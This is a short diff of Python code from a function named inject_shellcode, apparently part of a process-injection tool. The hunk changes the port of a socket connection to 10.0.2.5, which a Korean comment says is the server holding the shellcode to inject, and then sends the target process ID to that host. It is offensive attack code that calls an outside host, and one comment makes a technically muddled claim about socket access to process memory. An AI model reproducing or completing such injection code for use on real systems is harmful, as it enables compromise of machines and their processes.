@@ -46,7 +46,7 @@ def inject_shellcode(pid):
         try:
             # 프로세스 메모리에 접근할 수 있는 권한을 가진 통신 소켓 생성
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(('10.0.2.5', 5600))  # 삽입할 쉘코드가 실행 중인 서버 주소와 포트
+            s.connect(('10.0.2.5', 9999))  # 삽입할 쉘코드가 실행 중인 서버 주소와 포트
 
             # 프로세스 ID를 전송
             s.send(str(pid))
